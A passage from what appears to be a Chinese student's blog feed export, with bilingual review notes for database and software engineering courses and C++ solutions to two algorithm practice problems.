<li>With double buffers, when the CPU is processing the current block of data in buffer 1 [<strong>1 mark</strong>], it can also retrieve the next block into buffer 2 at the same time. When processing of buffer 1 is done, the CPU can then move on to the next block in buffer 2 immediately without waiting. </li>
</ul>
<h3 id="What-is-label-security-How-does-an-administrator-enforce-it-（标签安全，管理员如何管理）"><a href="#What-is-label-security-How-does-an-administrator-enforce-it-（标签安全，管理员如何管理）" class="headerlink" title="What is label security? How does an administrator enforce it?（标签安全，管理员如何管理）"></a>What is label security? How does an administrator enforce it?（标签安全，管理员如何管理）</h3><ul>
<li>Rows of data are labelled to indicate the level and nature of their sensitivity. A label on a row of data specifies the sensitivity of the information in the row and explicitly defines the criteria that must be met for a user to access that row.</li>
<li>Create the label security policy container.（标签安全策略容器）</li>
<li>Create data labels for the label security policy. （创建数据标签）</li>
<li>Authorise users for the label security policy.（授权用户）</li>
<li>Grant privileges to users and trusted stored program units.（给予权限）</li>
</ul>
<h3 id="What-is-flow-control-as-a-security-measure-What-types-of-flow-control-exists-（流量控制类型，作用）"><a href="#What-is-flow-control-as-a-security-measure-What-types-of-flow-control-exists-（流量控制类型，作用）" class="headerlink" title="What is flow control as a security measure? What types of flow control exists?（流量控制类型，作用）"></a>What is flow control as a security measure? What types of flow control exists?（流量控制类型，作用）</h3><ul>
<li>Flow controls, most commonly, use a concept of security classes, where transmission of data is blocked if the receiver has a security level lower than the sender. There are two types of flow control:</li>
<li>Explicit flows, consequences of assignments.（显示流量控制）</li>
<li>Implicit flows, generated by conditions.（隐式流量控制）</li>
</ul>
<h3 id="Discuss-three-types-of-arrays-in-PHP-（php中的数组）"><a href="#Discuss-three-types-of-arrays-in-PHP-（php中的数组）" class="headerlink" title="Discuss three types of arrays in PHP.（php中的数组）"></a>Discuss three types of arrays in PHP.（php中的数组）</h3><ul>
<li>An array in PHP is actually an ordered map. A map is a type that associates values to keys.    This type is optimised for several difference users; it can be treated as an array, a list, a hash table, a dictionary, etc. In PHP, the three types of arrays are: (a) indexed arrays, (b) associative arrays, and (c) multidimensional arrays. （索引数组，关联数组，多维数组）</li>
<li>An indexed array is an array with a numeric key. It stores each array element with a numeric index.</li>
<li>An associative array is an array where each key has its own specific value. The keys assigned to values can be arbitrary and user defined strings.</li>
<li>A multidimensional array is an array containing one or more arrays within itself. Each element in the array can also be an array and each element in the sub-array can be an array or further contain array within itself.</li>
</ul>
<h3 id="What-are-PHP-auto-global-variables-（自动全局变量）"><a href="#What-are-PHP-auto-global-variables-（自动全局变量）" class="headerlink" title="What are PHP auto-global-variables?（自动全局变量）"></a>What are PHP auto-global-variables?（自动全局变量）</h3><ul>
<li>PHP auto-global-variables are built-in variables that are always available in all scopes.   Some predefined variables in PHP are super globals, which means that they are always accessible, regardless of scope, and you can access them from any function, class or file without having to do anything special.</li>
</ul>
<h3 id="What-is-the-CAP-theorem-Which-of-the-three-properties-consistency-availability-partition-tolerance-are-most-important-in-NoSQL-systems-（一致性，可用性和分区容错性）"><a href="#What-is-the-CAP-theorem-Which-of-the-three-properties-consistency-availability-partition-tolerance-are-most-important-in-NoSQL-systems-（一致性，可用性和分区容错性）" class="headerlink" title="What is the CAP theorem? Which of the three properties (consistency, availability, partition tolerance) are most important in NoSQL systems?（一致性，可用性和分区容错性）"></a>What is the CAP theorem? Which of the three properties (consistency, availability, partition tolerance) are most important in NoSQL systems?（一致性，可用性和分区容错性）</h3><ul>
<li>In theoretical computer science, the CAP theorem states that any distributed data store can provide only two of the following three guarantees: consistency, availability, and partition tolerance. Consistency guarantees that every read receives the most recent write or an error. Availability guarantees that every request receives a non-error response, without the guarantee that it contains the most recent write. Partition tolerance guarantees that the system continues to operate despite an arbitrary number of messages being dropped or delayed by the network between nodes.</li>
<li>In a networked NoSQL system, partition tolerance is a must. Network partitions and dropped or delayed messages are a fact in these networked shared-data systems and it must be handled appropriately. [<strong>1 mark</strong>] Consequently, system designers must choose between consistency and availability. A NoSQL system that prioritises availability over consistency can respond with possibly stale data. [<strong>1 mark</strong>] In contrast, a NoSQL system that prioritises consistency over availability can respond with the latest updated data. The system can be distributed across multiple servers and is designed to operate reliably even in the presence of network partitions. [<strong>1 mark</strong>] So, the partition tolerance and consistency properties are most important in NoSQL systems that require immediate consistency.</li>
</ul>
<h3 id="What-are-the-similarities-and-differences-between-consistency-in-CAP-versus-consistency-in-ACID"><a href="#What-are-the-similarities-and-differences-between-consistency-in-CAP-versus-consistency-in-ACID" class="headerlink" title="What are the similarities and differences between consistency in CAP versus consistency in ACID"></a>What are the similarities and differences between consistency in CAP versus consistency in ACID</h3><h3 id="What-are-the-differences-between-structured-semi-structured-and-unstructured-data-（结构化数据和非结果化数据）"><a href="#What-are-the-differences-between-structured-semi-structured-and-unstructured-data-（结构化数据和非结果化数据）" class="headerlink" title="What are the differences between structured, semi-structured and unstructured data?（结构化数据和非结果化数据）"></a>What are the differences between structured, semi-structured and unstructured data?（结构化数据和非结果化数据）</h3><ul>
<li>Structured data can be displayed in rows, columns and relational databases. Unstructured data cannot be displayed in rows, columns and relational databases.</li>
<li>Structured data is comprised of numbers, dates and strings. Unstructured data is comprised of images, audio, video, word processing files, emails, spreadsheets, etc.</li>
<li>In contrast to structured data, which requires less storage, unstructured data requires more storage. Also, it is more difficult to manage and protect unstructured data with legacy solutions. </li>
<li>Semi-structured data is information that doesn’t consist of structured data but still has some structure to it. It includes key-value stores and graph databases. </li>
</ul>
<h3 id="What-are-the-differences-between-the-use-of-tags-in-XML-versus-HTML-（html和xml的标签区别）"><a href="#What-are-the-differences-between-the-use-of-tags-in-XML-versus-HTML-（html和xml的标签区别）" class="headerlink" title="What are the differences between the use of tags in XML versus HTML?（html和xml的标签区别）"></a>What are the differences between the use of tags in XML versus HTML?（html和xml的标签区别）</h3><ul>
<li>XML provides namespaces support while HTML does not provide namespaces support. XML namespaces provide a method to avoid element name conflicts.</li>
<li>In contrast to HTML tags, which are used for displaying data, XML tags are used for describing data not displaying it.</li>
</ul>
<h3 id="What-is-the-difference-between-XML-schema-and-XML-DTD-（xml模式和文档类型描述符）"><a href="#What-is-the-difference-between-XML-schema-and-XML-DTD-（xml模式和文档类型描述符）" class="headerlink" title="What is the difference between XML schema and XML DTD? （xml模式和文档类型描述符）"></a>What is the difference between XML schema and XML DTD? （xml模式和文档类型描述符）</h3><ul>
<li>DTD stands for Document Type Definition. [<strong>1 mark</strong>] A DTD defines the structure and the legal elements and attributes of an XML document. [<strong>1 mark</strong>] DTD is the predecessor of XML schema. [<strong>1 mark</strong>] While DTD provides the basic structure and grammar for defining a XML document, in addition to that XML schema provides methods to define constraints on the data contained in the document. [<strong>2 marks</strong>] Therefore, XML schema is considered to be richer and more powerful than DTD.</li>
</ul>
<h3 id="What-are-the-differences-between-row-level-and-statement-level-active-trigger-（行级触发器和语句触发器）"><a href="#What-are-the-differences-between-row-level-and-statement-level-active-trigger-（行级触发器和语句触发器）" class="headerlink" title="What are the differences between row-level and statement-level active trigger?（行级触发器和语句触发器）"></a>What are the differences between row-level and statement-level active trigger?（行级触发器和语句触发器）</h3><ul>
<li>Row level triggers execute once for each and every row in the transaction. In contrast, statement level triggers execute only once for each single transaction. </li>
<li>Row level triggers are specifically used for data handling purposes. In contrast, statement level trigger are used for enforcing all additional security on the transactions performed on the table.</li>
<li>For example, if 200 rows are to be inserted into a table, the row level trigger would execute 200 times. In contrast, if 200 rows are to be inserted into a table, a statement level trigger would only execute once.</li>
</ul>
<h3 id="How-does-clustering-differ-from-classification-（聚类和分类）"><a href="#How-does-clustering-differ-from-classification-（聚类和分类）" class="headerlink" title="How does clustering differ from classification?（聚类和分类）"></a>How does clustering differ from classification?（聚类和分类）</h3><ul>
<li>Classification is a supervised machine learning approach where a specific label is provided to the machine learning model to classify new observations. In contrast to classification, clustering is an unsupervised machine learning approach where no specific labels are available in the dataset and grouping is performed on similarities basis.</li>
</ul>
<h3 id="What-are-the-difficulties-of-mining-association-rules-from-large-databases-（从大型数据库挖掘关联规则）"><a href="#What-are-the-difficulties-of-mining-association-rules-from-large-databases-（从大型数据库挖掘关联规则）" class="headerlink" title="What are the difficulties of mining association rules from large databases?（从大型数据库挖掘关联规则）"></a>What are the difficulties of mining association rules from large databases?（从大型数据库挖掘关联规则）</h3><ul>
<li>Mining of association rules in large databases is a challenging task. An Apriori algorithm is widely used to find out the frequent itemsets from the database. [<strong>1 mark</strong>] However, it will be inefficient on large databases because it will require more I/O load. Another disadvantage of association rule mining is that they can produce boring rules [<strong>1 mark</strong>], have many discovered rules [<strong>1 mark</strong>], and perform poorly. [<strong>1 mark</strong>]</li>
</ul>
]]></content>
      <categories>
        <category>大二课程</category>
      </categories>
      <tags>
        <tag>校内课程</tag>
        <tag>复习</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假算法练习01</title>
    <url>/2023/01/23/%E5%AF%92%E5%81%87%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A001/</url>
    <content><![CDATA[<p>csoj练习题目第一天。</p>
<h2 id="新年礼物"><a href="#新年礼物" class="headerlink" title="新年礼物"></a>新年礼物</h2><p>签到题，直接模拟过程即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 100005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> price[MAX],beauty[MAX];</span><br><span class="line"><span class="comment">//vector&lt;int&gt; p(n),w(n);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> step,<span class="type">int</span> counts,<span class="type">int</span> now_beauty,<span class="type">int</span> now_price)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(step!=n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(now_beauty&lt;beauty[step+<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(price[step+<span class="number">1</span>]&lt;now_price) counts++;</span><br><span class="line">			now_price=price[step+<span class="number">1</span>];</span><br><span class="line">			now_beauty=beauty[step+<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		step++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> counts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) cin&gt;&gt;beauty[i];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) cin&gt;&gt;price[i];</span><br><span class="line">	cout&lt;&lt;<span class="built_in">func</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="灯笼展"><a href="#灯笼展" class="headerlink" title="灯笼展"></a>灯笼展</h2><p>这题我的第一思路是走一步排序并找第k小，感觉慢了，后来发现只需要保证前k小即保证了第k个一定是最小的，也就是说，这个题需要每走一步维护一次前k小的数。</p>
<p>代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 100005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n,k;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">	<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(n)</span></span>;<span class="comment">//一定要在输入n之后再定义</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span>&amp; x : a) cin&gt;&gt;x;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> &amp;x:a)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(q.<span class="built_in">size</span>()&lt;k||q.<span class="built_in">top</span>()&gt;x) cout&lt;&lt;<span class="string">&quot;-1&quot;</span>&lt;&lt;endl;</span><br><span class="line">		<span class="keyword">else</span> cout&lt;&lt;q.<span class="built_in">top</span>()&lt;&lt;endl;</span><br><span class="line">		q.<span class="built_in">push</span>(x);</span><br><span class="line">		<span class="keyword">if</span>(q.<span class="built_in">size</span>()&gt;k) q.<span class="built_in">pop</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个代码有几点注意的地方，首先是容器vector和priority_queue()。<strong>使用vector代替数组时要注意先输入n再定义vector，否则会出现经典的segment fault！！！</strong>然后priority_queue()是一个可以自己排序的一个队列，push元素进入时会自动排序并使最顶的元素为最大值，即从小到大排序，这样每走一次将该元素入队，自动排序后判断队列长度和k的大小关系，使该队列数字保持在k个且是前k小，之后每次达成条件输入队顶数字即可。</p>
]]></content>
      <categories>
        <category>做题&amp;活动&amp;比赛の记录</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>大二上软件工程导论课程复习</title>
    <url>/2022/12/06/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA%E8%AF%BE%E7%A8%8B%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p>整理ppt,课件等等。</p>
<h3 id="Waterfall-model-（瀑布模型）"><a href="#Waterfall-model-（瀑布模型）" class="headerlink" title="Waterfall model （瀑布模型）"></a>Waterfall model （瀑布模型）</h3><p>The waterfall model is a plan-driven process. When you encounter a problem at a certain stage, you solve the problem under the current stage. </p>
<p>瀑布模型是一个由<strong>计划驱动</strong>的过程。当您在某个阶段遇到问题时，您可以在当前阶段下解决该问题。但要注意的是瀑布模型不能回到上一个阶段。</p>
<h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><ul>
<li>产品简单或总量小，可以明确找到每个阶段的所有潜在问题</li>
<li>所有潜在问题可以在每个阶段进行预测。</li>
<li>外部原因导致，比如多个公司共同开发且公司之间交流成本昂贵</li>
</ul>
<h3 id="Incremental-development-model-（增量开发模型）"><a href="#Incremental-development-model-（增量开发模型）" class="headerlink" title="Incremental development model （增量开发模型）"></a>Incremental development model （增量开发模型）</h3><p>Specification, development, and validation activities are interleaved rather than separate, with rapid feedback across activities.</p>
<p>规范、开发和验证活动是交错的，而不是分开的，跨活动具有快速的反馈。</p>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li>适用于敏捷开发</li>
<li>具备快速的反馈</li>
<li>能更早的由客户使用并从中获得价值</li>
<li>实现需求变更的成本降低了</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>整个流程不可视</li>
<li>如果系统发展迅速，每个版本的文档没有成本效益</li>
<li>系统结构会随着新的增量而退化</li>
<li>不支持大型复杂，长寿命系统</li>
</ul>
<h3 id="Integration-and-Configuration-（集成和配置）"><a href="#Integration-and-Configuration-（集成和配置）" class="headerlink" title="Integration and Configuration （集成和配置）"></a>Integration and Configuration （集成和配置）</h3><h4 id="经常被重用"><a href="#经常被重用" class="headerlink" title="经常被重用"></a>经常被重用</h4><ul>
<li>特定环境下的应用程序</li>
<li>组件或集成包开发对象的集合（python第三方库）</li>
<li>web服务</li>
</ul>
<h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ul>
<li>降低成本，提高速度</li>
<li>减少测试负荷，保证产品质量</li>
</ul>
<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>可能有需求无法实现</li>
<li>可能失去对系统演化控制，因为新版本不受控制</li>
</ul>
<h3 id="Project-management-（项目管理）"><a href="#Project-management-（项目管理）" class="headerlink" title="Project management  （项目管理）"></a>Project management  （项目管理）</h3><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><ul>
<li>To deliver the software to the customer at the agreed time.     <strong>按时交货</strong></li>
<li>To keep overall costs within budget     <strong>缩紧腰包</strong></li>
<li>To deliver software that meets the customer’s expectations.   <strong>按质交货</strong></li>
<li>To maintain a coherent and well-functioning development team.  <strong>找好队友</strong></li>
</ul>
<h4 id="Project-planning"><a href="#Project-planning" class="headerlink" title="Project planning"></a>Project planning</h4><p>PMs are responsible for planning, estimating, and scheduling project development and assigning people to tasks. PMs supervise the work to ensure that it is carried out to the required standards.     <strong>工头监督</strong></p>
<h4 id="Risk-management"><a href="#Risk-management" class="headerlink" title="Risk management"></a>Risk management</h4><p>PMs have to assess the risks that may affect a project, monitor these risks, and take action when problems arise. <strong>工头风控</strong></p>
<h4 id="People-management"><a href="#People-management" class="headerlink" title="People management"></a>People management</h4><p>PMs are responsible for managing a team of people. They have to choose people for their team and establish ways of working that lead to effective team performance.   <strong>工头招人</strong></p>
<h3 id="Requirements-（需求）"><a href="#Requirements-（需求）" class="headerlink" title="Requirements  （需求）"></a>Requirements  （需求）</h3><h4 id="Functional-requirements-（功能性需求）"><a href="#Functional-requirements-（功能性需求）" class="headerlink" title="Functional requirements （功能性需求）"></a>Functional requirements （功能性需求）</h4><p>These are statements of services the system should provide, how the system should react to particular inputs, and how the system should behave in particular situations.</p>
<p>就是系统对于输入的应对</p>
<h4 id="Non-functional-requirements-（非功能性需求）"><a href="#Non-functional-requirements-（非功能性需求）" class="headerlink" title="Non-functional requirements （非功能性需求）"></a>Non-functional requirements （非功能性需求）</h4><ul>
<li>Non-functional requirements usually specific or constrain characteristics of the system as a whole. They may relate to emergent system properties such as reliability, response time, and memory use.   <strong>可靠性，效应时间，内存等等</strong></li>
</ul>
<h4 id="Requirements-engineering-process"><a href="#Requirements-engineering-process" class="headerlink" title="Requirements engineering process"></a>Requirements engineering process</h4><p>过程：</p>
<ul>
<li>Requirements elicitation  <strong>需求引出，发现需求</strong></li>
<li>Requirements specification    <strong>将需求规范化为标准形式</strong></li>
<li>Requirements validation    <strong>需求验证</strong></li>
</ul>
<h3 id="System-Modeling-系统模型"><a href="#System-Modeling-系统模型" class="headerlink" title="System Modeling  (系统模型)"></a>System Modeling  (系统模型)</h3><p> When we discuss the system with stakeholders, document the system, or generate a system implementation, we may use the <strong>graphical structural model</strong>. </p>
<h3 id="Context-models"><a href="#Context-models" class="headerlink" title="Context models"></a>Context models</h3><p>showing the relationships between the systems in the environment</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/a8daad2c1df9342b.png" alt=""></p>
<h3 id="Business-process-model"><a href="#Business-process-model" class="headerlink" title="Business process model"></a>Business process model</h3><p>showing human and automated processes in which particular software systems are used. </p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/487e7b8825c50b06.png" alt=""></p>
<h3 id="Interaction-models"><a href="#Interaction-models" class="headerlink" title="Interaction models"></a>Interaction models</h3><ul>
<li>showing Interactions between the software being developed and other systems in its environment.</li>
<li>showing interactions between the components of a software system</li>
</ul>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/b9bd94dbec1970b3.png" alt=""></p>
<h3 id="Structural-model"><a href="#Structural-model" class="headerlink" title="Structural model"></a>Structural model</h3><p><img src="https://s3.bmp.ovh/imgs/2022/12/06/9cf85b6003874b16.png" alt=""></p>
<h3 id="Behavioural-model"><a href="#Behavioural-model" class="headerlink" title="Behavioural model"></a>Behavioural model</h3><p>showing what happens or what is supposed to happen when a system responds to a stimulus from its environment. </p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/9f37efea444efcc8.png" alt=""></p>
<h3 id="Architectural-design-架构设计"><a href="#Architectural-design-架构设计" class="headerlink" title="Architectural design (架构设计)"></a>Architectural design (架构设计)</h3><h4 id="Architectural-design-decisions"><a href="#Architectural-design-decisions" class="headerlink" title="Architectural design decisions"></a>Architectural design decisions</h4><p>During the architectural design process, system architects have to make a number of structural decisions that profoundly affect the system and its development process. </p>
<h4 id="Architectural-views"><a href="#Architectural-views" class="headerlink" title="Architectural views"></a>Architectural views</h4><p>4+1views.</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/08/5e8dc7dc54e72cb7.png" alt=""></p>
<h3 id="Architectural-patterns"><a href="#Architectural-patterns" class="headerlink" title="Architectural patterns"></a>Architectural patterns</h3><h4 id="Layered-architecture-分层架构"><a href="#Layered-architecture-分层架构" class="headerlink" title="Layered architecture (分层架构)"></a>Layered architecture (分层架构)</h4><p>Organizes the system into layers, with related functionality associated with each layer. </p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/08/e9d82bbd80ca006d.png" alt=""></p>
<ul>
<li>when building new facilities on top of existing systems; </li>
<li>when the development is spread across several teams with each team responsibility for a layer of functionality;</li>
<li>when there is a requirement for multilevel security.</li>
</ul>
<h4 id="Repository-architecture"><a href="#Repository-architecture" class="headerlink" title="Repository architecture"></a><strong>Repository architecture</strong></h4><p>All data in a system is managed in a central repository that is accessible to all system components. </p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/08/736ce17f250ee2bd.png" alt=""></p>
<ul>
<li>When a system in which large volumes of information are generated that has to be stored for a long time. </li>
<li>You may also use it in data-driven systems where the inclusion of data in the repository triggers an action or tool. </li>
</ul>
<h4 id="Client–server-architecture"><a href="#Client–server-architecture" class="headerlink" title="Client–server architecture"></a>Client–server architecture</h4><p>The system is presented as a set of services, with each service delivered by a separate server. </p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/08/ce11a8efd77f4c95.png" alt=""></p>
<ul>
<li>When data in a shared database has to be accessed from a range of locations. </li>
</ul>
<h3 id="Design-Patterns-（设计模式）"><a href="#Design-Patterns-（设计模式）" class="headerlink" title="Design Patterns （设计模式）"></a>Design Patterns （设计模式）</h3><p>A software design pattern is a general, reusable solution to a commonly occurring problem within a given context in software design.</p>
<p>Someone has already solved your problems. So, you can exploit the wisdom and lessons learned by other developers who’ve been down the same design problem road and survived the trip.</p>
<p>Instead of code reuse, with patterns you get experience reuse. </p>
<h4 id="Strategy-Pattern-（策略模式）"><a href="#Strategy-Pattern-（策略模式）" class="headerlink" title="Strategy Pattern （策略模式）"></a>Strategy Pattern （策略模式）</h4><p>Defines a family of algorithms, encapsulates(封装) each one, and makes them interchangeable. Strategy lets the algorithm vary independently from clients that use it. </p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/08/8ec9fbbb5bbc887c.png" alt=""></p>
<h4 id="Observer-Pattern"><a href="#Observer-Pattern" class="headerlink" title="Observer Pattern"></a>Observer Pattern</h4><p><img src="https://s3.bmp.ovh/imgs/2022/12/08/be974ac912f7a03e.png" alt=""></p>
<h4 id="Decorator-Pattern"><a href="#Decorator-Pattern" class="headerlink" title="Decorator Pattern"></a>Decorator Pattern</h4><p><img src="https://s3.bmp.ovh/imgs/2022/12/08/95ad72f51921afd7.png" alt=""></p>
<h4 id="Adapter-Pattern"><a href="#Adapter-Pattern" class="headerlink" title="Adapter Pattern"></a>Adapter Pattern</h4><p><img src="https://s3.bmp.ovh/imgs/2022/12/08/03181e389eebc31a.png" alt=""></p>
<p>至于这个就太抽象了，不知道是个啥模式：</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/12/08/3590f4979f197878.png" alt=""></p>
<h3 id="Software-Testing"><a href="#Software-Testing" class="headerlink" title="Software Testing"></a>Software Testing</h3><ul>
<li>The purpose of testing is to show that a program does what it is intended to do and to discover program <strong>defects</strong>(缺点) before it is put into use. </li>
<li>When you test software, you execute a program using artificial data. Then, you check the results of a test run for errors, <strong>anomalies</strong>（异常）, or information about the program’s non-functional attributes.</li>
</ul>
<h4 id="Development-testing-（开发测试）"><a href="#Development-testing-（开发测试）" class="headerlink" title="Development testing （开发测试）"></a>Development testing （开发测试）</h4><p>三个阶段：</p>
<ul>
<li>Unit testing – code testing</li>
<li>Component testing – interface testing</li>
<li>System testing — interaction testing, use case based</li>
</ul>
<h4 id="Test-driven-development-process"><a href="#Test-driven-development-process" class="headerlink" title="Test-driven development process"></a>Test-driven development process</h4><p>步骤：</p>
<ul>
<li>Start by identifying the increment or functionality that is required. This should normally be small and implementable in a few lines of code.</li>
<li>Write a test for this functionality and implement it as an automated test. This means that the test can be executed and will report whether or not it has passed or failed.</li>
<li>Run the test, along with all other tests that have been implemented. Initially, you have not implemented the functionality, so the new test will fail. This is <strong>deliberate</strong>（有意的） as it shows that the test adds something to the test set.</li>
<li>Implement the functionality and re-run the test. This may involve <strong>refactoring</strong>（重构） existing code to improve it and add new code to what’s already there.</li>
<li>Once all tests run successfully, move on to implement the next chunk of functionality.</li>
</ul>
<p>优点：</p>
<ul>
<li>Code coverage.</li>
<li>Regression testing（回归测试）易查新错</li>
<li>Simplified debugging （简化测试）易找bug</li>
<li>System documentation （系统文档）易读</li>
</ul>
<h4 id="Release-testing"><a href="#Release-testing" class="headerlink" title="Release testing"></a>Release testing</h4><ul>
<li>The system development team should not be responsible for release testing. 不背锅！！！</li>
</ul>
<h4 id="Requirements-based-testing-（基于需求的测试）"><a href="#Requirements-based-testing-（基于需求的测试）" class="headerlink" title="Requirements-based testing （基于需求的测试）"></a>Requirements-based testing （基于需求的测试）</h4><p>Requirements-based testing is a systematic approach to test-case design where you consider each requirement and derive a set of tests for it. ( A general principle of good requirements engineering practice is that requirements should be testable. )</p>
<p>基于需求的测试是测试用例设计的系统方法，您考虑每个需求并为其导出一组测试。（良好要求工程实践的一个一般原则是，要求应该是可测试的。）</p>
<h4 id="Scenario-testing-（场景测试）"><a href="#Scenario-testing-（场景测试）" class="headerlink" title="Scenario testing （场景测试）"></a>Scenario testing （场景测试）</h4><ul>
<li>A scenario is a story that describes one way in which the system might be used.</li>
<li>When you use a scenario-based approach, you are normally testing several requirements within the same scenario. Thus, as well as checking individual requirements, you are also checking that combinations of requirements do not cause problems.</li>
</ul>
<h4 id="Performance-testing-（性能测试）"><a href="#Performance-testing-（性能测试）" class="headerlink" title="Performance testing （性能测试）"></a>Performance testing （性能测试）</h4><ul>
<li>Once a system has been completely integrated, it is possible to test for emergent properties, such as performance and reliability. Performance tests have to be designed to ensure that the system can process its intended load.   <strong>一旦一个系统被完全集成，就有可能测试紧急特性，如性能和可靠性。必须设计性能测试，以确保系统能够处理其预期的负载。</strong></li>
<li>This usually involve running a series of tests where you increase the load until the system performance becomes unacceptable. This approach is also known as stress testing. Stress testing helps to:    <strong>1.Test the failure behaviour of the system. Stress testing checks that overloading the system causes it to “fail-soft’’ rather than collapse under its load.</strong> <strong>2.Reveal defects that only show up when the system is fully loaded. Although it can be argued that these defects are unlikely to cause system failures in normal use, there may be unusual combinations of circumstances that the stress testing replicates.</strong></li>
</ul>
<p>翻译：</p>
<ol>
<li>测试系统的故障行为。压力测试检查系统过载导致”软件失败”，而不是在其负载下崩溃。</li>
<li>显示仅在系统完全加载时才会显示的缺陷。虽然可以认为这些缺陷在正常使用中不太可能导致系统故障，但可能存在压力测试重复的异常情况组合。</li>
</ol>
<h3 id="Software-evolution-（软件演变）"><a href="#Software-evolution-（软件演变）" class="headerlink" title="Software evolution （软件演变）"></a>Software evolution （软件演变）</h3><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p><img src="https://s3.bmp.ovh/imgs/2022/12/08/1eb4a4d78ff6869f.png" alt=""></p>
<h4 id="Legacy-system（遗留系统）"><a href="#Legacy-system（遗留系统）" class="headerlink" title="Legacy system（遗留系统）"></a>Legacy system（遗留系统）</h4><p>Legacy systems are older systems that rely on languages and technology that are no longer used for new systems development. </p>
<p>四种选择：</p>
<ol>
<li>Scrap the system completely. <strong>报废</strong></li>
<li>Leave the system unchanged and continue with regular maintenance. <strong>定期维护</strong></li>
<li>Reengineer the system to improve its maintainability. <strong>重开</strong></li>
<li>Replace all or part of the system with a new system.<strong>换个新的</strong></li>
</ol>
<h4 id="Types-of-software-maintenance（软件维护类型）"><a href="#Types-of-software-maintenance（软件维护类型）" class="headerlink" title="Types of software maintenance（软件维护类型）"></a>Types of software maintenance（软件维护类型）</h4><p>Software maintenance is the general process of changing a system after it has been delivered.</p>
<p>三种类型的软件维护：</p>
<ol>
<li>Fault repairs to fix bugs and vulnerabilities<strong>修bug修漏洞</strong></li>
<li>Environmental adaptation to adapt the software to new platforms and environments. <strong>使其适应新的平台和环境</strong></li>
